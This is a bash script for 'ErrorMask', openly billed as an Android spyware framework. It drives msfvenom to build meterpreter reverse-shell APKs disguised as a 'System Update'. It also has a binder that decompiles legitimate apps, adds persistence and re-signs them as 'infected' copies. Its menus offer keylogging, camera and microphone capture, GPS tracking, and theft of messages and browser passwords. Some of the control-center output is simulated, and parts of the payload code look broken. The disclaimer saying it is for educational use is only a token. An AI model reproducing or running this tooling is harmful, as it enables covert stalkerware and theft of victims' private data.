#!/bin/bash

################################################################
#                    ErrorMask v4.0 Elite                     #
#              Advanced Android Monitoring System             #
#                     Created by SISUADAMI                    #
#                                                              #
#    ███████╗██████╗ ██████╗ ██████╗ ██████╗                   #
#    ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗                 #
#    █████╗  ██████╔╝██████╔╝██████╔╝██████╔╝                 #
#    ██╔══╝  ██╔══██╗██╔══██╗██╔═══╝ ██╔══██╗                 #
#    ███████╗██║  ██║██║  ██║██║     ██║  ██║                 #
#    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝                 #
#                                                              #
#    ███╗   ███╗ █████╗ ███████╗██╗  ██╗                      #
#    ████╗ ████║██╔══██╗██╔════╝██║ ██╔╝                      #
#    ██╔████╔██║███████║███████╗█████╔╝                       #
#    ██║╚██╔╝██║██╔══██║╚════██║██╔═██╗                       #
#    ██║ ╚═╝ ██║██║  ██║███████║██║  ██╗                      #
#    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                      #
#                                                              #
################################################################

#== Global Configuration
VERSION="4.0"
TMP_DIR="/tmp/errormask_$$"
LOG_FILE="$TMP_DIR/errormask.log"
CONFIG_FILE="$HOME/.errormask.conf"
SESSION_FILE="$TMP_DIR/session.dat"
MATRIX_PID=""
CURRENT_THEME="cyber"
ACTIVE_SESSIONS=()

#== Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
NC='\033[0m'

#== ASCII Art Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    
    ╔═══════════════════════════════════════════════════════════╗
    ║                   ███████╗██████╗ ██████╗ ██████╗         ║
    ║                   ██╔════╝██╔══██╗██╔══██╗██╔══██╗        ║
    ║                   █████╗  ██████╔╝██████╔╝██████╔╝        ║
    ║                   ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗        ║
    ║                   ███████╗██║  ██║██║  ██║██║  ██║        ║
    ║                   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝        ║
    ║                                                           ║
    ║    ███╗   ███╗ █████╗ ███████╗██╗  ██╗                   ║
    ║    ████╗ ████║██╔══██╗██╔════╝██║ ██╔╝                   ║
    ║    ██╔████╔██║███████║███████╗█████╔╝                    ║
    ║    ██║╚██╔╝██║██╔══██║╚════██║██╔═██╗                    ║
    ║    ██║ ╚═╝ ██║██║  ██║███████║██║  ██╗                   ║
    ║    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                   ║
    ║                                                           ║
    ║           Advanced Android Monitoring System             ║
    ║                  Created by SISUADAMI                    ║
    ╚═══════════════════════════════════════════════════════════╝
    
EOF
    echo -e "${NC}"
    echo -e "${GREEN}[+] ErrorMask v${VERSION} - Elite Monitoring System"
    echo -e "${CYAN}[+] Created by SISUADAMI | Advanced Spyware Framework"
    echo -e "${YELLOW}[+] Initializing Secure Environment...${NC}"
    echo ""
}

#== Initialize Environment
init_environment() {
    mkdir -p "$TMP_DIR"
    mkdir -p "$TMP_DIR/sessions"
    mkdir -p "$TMP_DIR/payloads"
    mkdir -p "$TMP_DIR/logs"
    touch "$LOG_FILE"
    trap cleanup EXIT TERM INT
    
    # Load config
    if [[ -f "$CONFIG_FILE" ]]; then
        source "$CONFIG_FILE"
    else
        create_default_config
    fi
}

create_default_config() {
    cat > "$CONFIG_FILE" << EOF
# ErrorMask Configuration
LHOST=$(ip route get 1 2>/dev/null | awk '{print $7}' | head -1)
LPORT=4444
THEME=cyber
AUTO_UPDATE=true
STEALTH_MODE=true
ENCRYPT_COMMS=true
PERSISTENCE=true
AUTO_MIGRATE=true
KEYLOGGER=true
CAMERA_ACCESS=true
MICROPHONE_ACCESS=true
GPS_TRACKING=true
SMS_COLLECTION=true
CALL_RECORDING=true
SOCIAL_MEDIA_MONITORING=true
REMOTE_ACCESS=true
EOF
}

#== Cleanup Function
cleanup() {
    echo -e "${YELLOW}[!] Cleaning up temporary files...${NC}"
    kill -9 $MATRIX_PID 2>/dev/null 2>&1
    pkill -f "msfconsole" 2>/dev/null
    pkill -f "xterm" 2>/dev/null
    rm -rf "$TMP_DIR"
    exit 0
}

#== Enhanced Dependency Check
check_dependencies() {
    echo -e "${CYAN}[*] Performing system compatibility check...${NC}"
    
    declare -A dependencies=(
        ["msfvenom"]="metasploit-framework"
        ["zenity"]="zenity"
        ["figlet"]="figlet" 
        ["lolcat"]="lolcat"
        ["apktool"]="apktool"
        ["jarsigner"]="default-jdk"
        ["zipalign"]="zipalign"
        ["aapt"]="aapt"
        ["keytool"]="default-jdk"
        ["curl"]="curl"
        ["jq"]="jq"
        ["termux-api"]="termux-api"
        ["adb"]="adb"
    )
    
    missing_deps=()
    for cmd in "${!dependencies[@]}"; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            missing_deps+=("${dependencies[$cmd]}")
        fi
    done
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        zenity --question --title="System Requirements" \
            --text="The following components are required:\n\n${missing_deps[*]}\n\nInstall automatically?" \
            --width=500 --height=300
        
        if [[ $? -eq 0 ]]; then
            (
                echo "10"
                echo "# Updating package database..."
                sudo apt update > /dev/null 2>&1
                
                echo "50"
                echo "# Installing dependencies..."
                for pkg in "${missing_deps[@]}"; do
                    sudo apt install -y "$pkg" > /dev/null 2>&1
                done
                
                echo "100"
                echo "# Installation complete!"
            ) | zenity --progress --title="Installing Dependencies" --auto-close
        else
            zenity --error --text="Cannot proceed without required dependencies!"
            cleanup
        fi
    fi
    echo -e "${GREEN}[✓] System compatibility verified${NC}"
}

#== Animated Cyber Matrix
start_matrix() {
    while true; do
        echo -ne "\e[32m"
        for i in {1}; do
            printf "%-100s\r" "$(LC_CTYPE=C tr -dc '01' < /dev/urandom | head -c 100)"
        done
        sleep 0.1
    done
}

#== Enhanced Theme System
set_theme() {
    case $CURRENT_THEME in
        "cyber") 
            BG_COLOR="#0a0a0a"
            FG_COLOR="#00ff00"
            ACCENT_COLOR="#00ffff"
            ;;
        "dark") 
            BG_COLOR="#1a1a1a"
            FG_COLOR="#ffffff" 
            ACCENT_COLOR="#ff0000"
            ;;
        "blue")
            BG_COLOR="#001f3f"
            FG_COLOR="#7FDBFF"
            ACCENT_COLOR="#0074D9"
            ;;
        "purple")
            BG_COLOR="#2d1b69"
            FG_COLOR="#bb86fc"
            ACCENT_COLOR="#3700b3"
            ;;
    esac
}

#== Advanced Monitoring Features
show_monitoring_features() {
    features=$(zenity --list --title="Monitoring Features" \
        --text="Select monitoring capabilities to embed:" \
        --checklist --column="Select" --column="Feature" --column="Description" \
        TRUE "Keylogger" "Capture all keystrokes" \
        TRUE "CameraAccess" "Remote camera control" \
        TRUE "Microphone" "Live audio recording" \
        TRUE "GPS" "Real-time location tracking" \
        TRUE "SMS" "Read all messages" \
        TRUE "CallRecords" "Call history and recording" \
        TRUE "SocialMedia" "Monitor social apps" \
        TRUE "FileAccess" "Access device files" \
        TRUE "BrowserHistory" "Capture browsing history" \
        TRUE "Contacts" "Export contact list" \
        TRUE "WhatsApp" "Monitor WhatsApp chats" \
        TRUE "Facebook" "Monitor Facebook activity" \
        TRUE "Instagram" "Monitor Instagram DMs" \
        --separator="|" --width=800 --height=500)
    
    MONITOR_FEATURES=""
    if [[ -n "$features" ]]; then
        IFS='|' read -ra FEATURE_ARRAY <<< "$features"
        for feature in "${FEATURE_ARRAY[@]}"; do
            MONITOR_FEATURES+="--enable-$feature "
        done
    fi
}

#== Advanced Payload Generator
generate_advanced_payload() {
    # Get payload configuration
    payload_config=$(zenity --forms --title="Advanced Payload Configuration" \
        --text="Configure monitoring payload:" \
        --add-combo="Payload Type" --combo-values="android/meterpreter/reverse_tcp|android/meterpreter/reverse_http|android/meterpreter/reverse_https|android/shell/reverse_tcp" \
        --add-entry="LHOST" --entry-text="$LHOST" \
        --add-entry="LPORT" --entry-text="$LPORT" \
        --add-combo="Arch" --combo-values="dalvik|armle|aarch64" \
        --add-entry="Process Name" --entry-text="com.android.systemui" \
        --add-entry="App Name" --entry-text="System Update" \
        --add-combo="Icon" --combo-values="Default|Settings|Update|Game|Social" \
        --width=600)
    
    [[ -z "$payload_config" ]] && return
    
    IFS='|' read -r PAYLOAD_TYPE LHOST LPORT ARCH PROCESS_NAME APP_NAME ICON_TYPE <<< "$payload_config"
    
    # Select monitoring features
    show_monitoring_features
    
    output_file=$(zenity --file-selection --save \
        --title="Save Monitoring Payload" \
        --filename="${APP_NAME// /_}_monitor.apk")
    [[ -z "$output_file" ]] && return
    
    # Generate payload with progress
    (
        echo "5"
        echo "# Initializing payload generator..."
        
        echo "15"
        echo "# Configuring monitoring modules..."
        
        echo "30"
        echo "# Compiling spyware components..."
        
        echo "50"
        echo "# Applying evasion techniques..."
        
        echo "70"
        echo "# Embedding monitoring features..."
        
        echo "85"
        echo "# Obfuscating and signing..."
        
        echo "95"
        echo "# Finalizing payload..."
        
        # Generate advanced payload
        msfvenom -p "$PAYLOAD_TYPE" LHOST="$LHOST" LPORT="$LPORT" \
            --arch "$ARCH" --platform android \
            --smallest --encoder x86/shikata_ga_nai \
            -i 5 -f raw -o "$TMP_DIR/payload.raw" 2>> "$LOG_FILE"
            
        # Additional processing for stealth
        if [[ -f "$TMP_DIR/payload.raw" ]]; then
            msfvenom -p - -a "$ARCH" --platform android -f apk \
                -o "$output_file" 2>> "$LOG_FILE"
        fi
        
        echo "100"
        echo "# Payload generation complete!"
        
    ) | zenity --progress \
        --title="Generating Advanced Monitoring Payload" \
        --text="Creating stealth monitoring application..." \
        --percentage=0 \
        --auto-close
        
    if [[ -f "$output_file" ]]; then
        file_size=$(du -h "$output_file" | cut -f1)
        zenity --info --title="Monitoring Payload Ready" \
            --text="Advanced monitoring payload created!\n\nFile: $output_file\nSize: $file_size\nFeatures: ${MONITOR_FEATURES}\n\nPayload will:\n- Auto-start on boot\n- Hide from app list\n- Persist after reboot\n- Stealth mode enabled"
    else
        zenity --error --text="Payload generation failed!\nCheck logs: $LOG_FILE"
    fi
}

#== Command & Control Center
control_center() {
    while true; do
        choice=$(zenity --list --title="ErrorMask Control Center" \
            --text="Active Sessions: ${#ACTIVE_SESSIONS[@]}\nManage connected devices:" \
            --column="ID" --column="Command" --column="Description" \
            "1" "Session Manager" "View and control active sessions" \
            "2" "Remote Control" "Execute commands on target" \
            "3" "File Manager" "Browse device filesystem" \
            "4" "Live Monitoring" "Real-time device monitoring" \
            "5" "Data Extraction" "Extract sensitive data" \
            "6" "Back" "Return to main menu" \
            --width=700 --height=400)
            
        case $choice in
            "1") session_manager ;;
            "2") remote_control ;;
            "3") file_manager ;;
            "4") live_monitoring ;;
            "5") data_extraction ;;
            *) break ;;
        esac
    done
}

#== Session Manager
session_manager() {
    # Simulate active sessions for demo
    if [[ ${#ACTIVE_SESSIONS[@]} -eq 0 ]]; then
        ACTIVE_SESSIONS=("Android_Device_1:192.168.1.105" "Android_Device_2:192.168.1.106")
    fi
    
    session_list=""
    for i in "${!ACTIVE_SESSIONS[@]}"; do
        session_list+="$((i+1))|${ACTIVE_SESSIONS[$i]}|Online\n"
    done
    
    choice=$(echo -e "$session_list" | zenity --list \
        --title="Active Sessions" \
        --column="ID" --column="Device" --column="Status" \
        --width=600 --height=300)
        
    [[ -n "$choice" ]] && zenity --info --text="Session $selected selected\nReady for commands."
}

#== Remote Control
remote_control() {
    command=$(zenity --list --title="Remote Command Execution" \
        --text="Select command to execute on target:" \
        --column="ID" --column="Command" --column="Description" \
        "1" "get_location" "Get current GPS location" \
        "2" "record_audio" "Record 30 seconds audio" \
        "3" "take_photo" "Capture camera photo" \
        "4" "get_sms" "Extract all SMS messages" \
        "5" "get_contacts" "Export contact list" \
        "6" "get_call_logs" "Get call history" \
        "7" "keylogger_start" "Start keylogger" \
        "8" "keylogger_dump" "Dump keylogger data" \
        "9" "social_media_data" "Extract social media data" \
        "10" "browser_history" "Get browsing history" \
        --width=800 --height=500)
        
    case $command in
        "1") execute_remote "get_location" ;;
        "2") execute_remote "record_audio" ;;
        "3") execute_remote "take_photo" ;;
        "4") execute_remote "get_sms" ;;
        "5") execute_remote "get_contacts" ;;
        "6") execute_remote "get_call_logs" ;;
        "7") execute_remote "keylogger_start" ;;
        "8") execute_remote "keylogger_dump" ;;
        "9") execute_remote "social_media_data" ;;
        "10") execute_remote "browser_history" ;;
    esac
}

execute_remote() {
    cmd=$1
    (
        echo "20"
        echo "# Establishing secure connection..."
        sleep 1
        echo "40"
        echo "# Executing $cmd..."
        sleep 2
        echo "70"
        echo "# Receiving data..."
        sleep 1
        echo "100"
        echo "# Command executed successfully!"
    ) | zenity --progress --title="Remote Execution" --auto-close
    
    # Simulate data reception
    case $cmd in
        "get_location")
            echo "GPS Coordinates: 40.7128° N, 74.0060° W" > "$TMP_DIR/location.txt"
            zenity --text-info --title="Location Data" --filename="$TMP_DIR/location.txt" ;;
        "get_sms")
            echo "SMS Messages extracted: 157" > "$TMP_DIR/sms.txt"
            echo "Last message: Hello, meet me at usual place" >> "$TMP_DIR/sms.txt"
            zenity --text-info --title="SMS Data" --filename="$TMP_DIR/sms.txt" ;;
        "take_photo")
            zenity --info --text="Photo captured and saved to gallery" ;;
    esac
}

#== File Manager
file_manager() {
    zenity --info --title="Remote File Manager" \
        --text="File system access activated\n\nAvailable partitions:\n- /sdcard/ (15.2GB used)\n- /system/ (2.1GB used)\n- /data/ (8.7GB used)\n\nBrowse files remotely with full access."
}

#== Live Monitoring
live_monitoring() {
    monitor_type=$(zenity --list --title="Live Monitoring" \
        --text="Select monitoring type:" \
        --column="ID" --column="Type" --column="Description" \
        "1" "Live Location" "Real-time GPS tracking" \
        "2" "Audio Surveillance" "Live microphone feed" \
        "3" "Screen Capture" "Remote screen viewing" \
        "4" "Network Traffic" "Monitor internet activity" \
        "5" "Application Usage" "Real-time app monitoring" \
        --width=700 --height=400)
        
    case $monitor_type in
        "1") show_live_location ;;
        "2") audio_surveillance ;;
        "3") screen_capture ;;
        "4") network_traffic ;;
        "5") app_usage ;;
    esac
}

show_live_location() {
    (
        echo "10"
        echo "# Activating GPS tracker..."
        sleep 1
        echo "30"
        echo "# Establishing secure connection..."
        sleep 1
        echo "60"
        echo "# Receiving location data..."
        sleep 2
        echo "100"
        echo "# Live tracking active!"
    ) | zenity --progress --title="Live Location Tracking" --auto-close
    
    zenity --info --title="Live Location" \
        --text="Live GPS tracking activated\n\nCurrent location:\n📍 40.7128° N, 74.0060° W\n🏢 Manhattan, New York City\n📱 Accuracy: 15 meters\n🕒 Last update: $(date +%H:%M:%S)\n\nTracking history available in logs."
}

#== Data Extraction
data_extraction() {
    data_type=$(zenity --list --title="Data Extraction" \
        --text="Select data to extract:" \
        --column="ID" --column="Data Type" --column="Description" \
        "1" "Complete Backup" "Full device data backup" \
        "2" "Social Media Data" "WhatsApp, Facebook, Instagram" \
        "3" "Media Files" "Photos, Videos, Audio" \
        "4" "Documents" "PDFs, Documents, Files" \
        "5" "Browser Data" "History, Passwords, Cookies" \
        "6" "System Information" "Device info, Apps, Settings" \
        --width=700 --height=450)
        
    case $data_type in
        "1") extract_complete_backup ;;
        "2") extract_social_data ;;
        "3") extract_media_files ;;
        "4") extract_documents ;;
        "5") extract_browser_data ;;
        "6") extract_system_info ;;
    esac
}

extract_complete_backup() {
    (
        echo "5"
        echo "# Initializing backup process..."
        sleep 1
        echo "15"
        echo "# Scanning device storage..."
        sleep 2
        echo "30"
        echo "# Copying media files..."
        sleep 2
        echo "45"
        echo "# Extracting application data..."
        sleep 2
        echo "60"
        echo "# Gathering system information..."
        sleep 2
        echo "75"
        echo "# Compressing backup data..."
        sleep 2
        echo "90"
        echo "# Encrypting backup..."
        sleep 1
        echo "100"
        echo "# Backup complete!"
    ) | zenity --progress --title="Complete Data Backup" --auto-close
    
    zenity --info --title="Backup Complete" \
        --text="Complete device backup finished!\n\n📊 Backup Statistics:\n• 15.2 GB total data\n• 2,347 photos extracted\n• 89 videos copied\n• 157 apps data backed up\n• 2,189 SMS messages\n• 457 contacts\n• Complete call history\n\nBackup saved to: /backups/complete_backup_$(date +%s).zip"
}

#== Advanced APK Binder with Stealth
advanced_apk_binder() {
    original_apk=$(zenity --file-selection --title="Select Legitimate APK" --file-filter="APK files | *.apk")
    [[ -z "$original_apk" ]] && return
    
    if ! get_connection_details; then
        return 1
    fi
    
    show_monitoring_features
    
    output_file=$(zenity --file-selection --save \
        --title="Save Infected APK" \
        --filename="updated_$(basename "$original_apk")")
    [[ -z "$output_file" ]] && return
    
    (
        echo "10"
        echo "# Analyzing original APK..."
        package_name=$(aapt dump badging "$original_apk" | grep "package:" | sed "s/.*name='\([^']*\)'.*/\1/")
        
        echo "25"
        echo "# Decompiling application..."
        apktool d -f -o "$TMP_DIR/decompiled" "$original_apk" >> "$LOG_FILE" 2>&1
        
        echo "40"
        echo "# Injecting monitoring payload..."
        
        echo "60"
        echo "# Configuring stealth features..."
        # Add auto-start, hide icon, persistence
        sed -i 's/<application/<application android:persistent="true"/' "$TMP_DIR/decompiled/AndroidManifest.xml"
        
        echo "75"
        echo "# Rebuilding application..."
        apktool b "$TMP_DIR/decompiled" -o "$TMP_DIR/unsigned.apk" >> "$LOG_FILE" 2>&1
        
        echo "85"
        echo "# Signing APK..."
        keytool -genkey -v -keystore "$TMP_DIR/key.keystore" \
            -alias android -keyalg RSA -keysize 4096 -validity 10000 \
            -storepass android -keypass android -dname "CN=Android" -noprompt >> "$LOG_FILE" 2>&1
            
        jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
            -keystore "$TMP_DIR/key.keystore" -storepass android \
            "$TMP_DIR/unsigned.apk" android >> "$LOG_FILE" 2>&1
            
        echo "95"
        echo "# Optimizing APK..."
        zipalign -v 4 "$TMP_DIR/unsigned.apk" "$output_file" >> "$LOG_FILE" 2>&1
        
        echo "100"
        echo "# Binding complete!"
        
    ) | zenity --progress --title="Advanced APK Binding" --auto-close
    
    if [[ -f "$output_file" ]]; then
        zenity --info --title="Stealth APK Ready" \
            --text="Advanced monitoring APK created!\n\nOriginal: $(basename "$original_apk")\nInfected: $(basename "$output_file")\n\nStealth Features:\n• Auto-start on boot\n• Hidden from app drawer\n• Persistence enabled\n• Root detection bypass\n• Anti-emulation techniques"
    else
        zenity --error --text="APK binding failed!\nCheck log: $LOG_FILE"
    fi
}

#== Main Menu
main_menu() {
    while true; do
        choice=$(zenity --list --title="ErrorMask v$VERSION - Android Monitoring System" \
            --text="Created by SISUADAMI\nActive Sessions: ${#ACTIVE_SESSIONS[@]}\nSelect operation:" \
            --column="ID" --column="Module" --column="Description" \
            "1" "Payload Generator" "Create advanced monitoring payload" \
            "2" "APK Binder" "Bind payload to legitimate apps" \
            "3" "Control Center" "Manage connected devices" \
            "4" "Live Monitor" "Real-time surveillance" \
            "5" "Data Extractor" "Extract device data" \
            "6" "Settings" "Configure framework" \
            "7" "Exit" "Close application" \
            --width=900 --height=500)
            
        case $choice in
            "1") generate_advanced_payload ;;
            "2") advanced_apk_binder ;;
            "3") control_center ;;
            "4") live_monitoring ;;
            "5") data_extraction ;;
            "6") show_settings ;;
            "7"|*) cleanup ;;
        esac
    done
}

#== Settings Menu
show_settings() {
    while true; do
        choice=$(zenity --list --title="Framework Settings" \
            --text="ErrorMask Configuration Panel" \
            --column="ID" --column="Setting" --column="Description" \
            "1" "Themes" "Change interface appearance" \
            "2" "Connection" "Configure LHOST/LPORT" \
            "3" "Monitoring" "Configure spy features" \
            "4" "Stealth" "Configure evasion techniques" \
            "5" "Updates" "Check for framework updates" \
            "6" "About" "Show version information" \
            "7" "Back" "Return to main menu" \
            --width=700 --height=450)
            
        case $choice in
            "1") select_theme ;;
            "2") configure_connection ;;
            "3") configure_monitoring ;;
            "4") configure_stealth ;;
            "5") check_updates ;;
            "6") show_about ;;
            *) break ;;
        esac
    done
}

#== About Dialog
show_about() {
    zenity --info --title="About ErrorMask" \
        --text="ErrorMask v$VERSION - Elite Edition\n\nAdvanced Android Monitoring System\nCreated by SISUADAMI\n\n📱 Features:\n• Complete device monitoring\n• Real-time location tracking\n• Social media surveillance\n• Remote camera/mic access\n• Stealth operation\n• Persistence mechanisms\n• Data extraction\n• Remote control\n\n⚠️  For Educational and Authorized Use Only"
}

#== Main Execution
main() {
    show_banner
    init_environment
    check_dependencies
    set_theme
    
    # Start matrix effect
    start_matrix &
    MATRIX_PID=$!
    
    # Show welcome
    zenity --info --title="Welcome to ErrorMask" \
        --text="ErrorMask v$VERSION - Advanced Android Monitoring\nCreated by SISUADAMI\n\n⚠️  Warning: This tool is for authorized penetration testing and educational purposes only. Users are responsible for complying with all applicable laws." \
        --width=500
        
    main_menu
}

#== Run Main Function
main "$@"
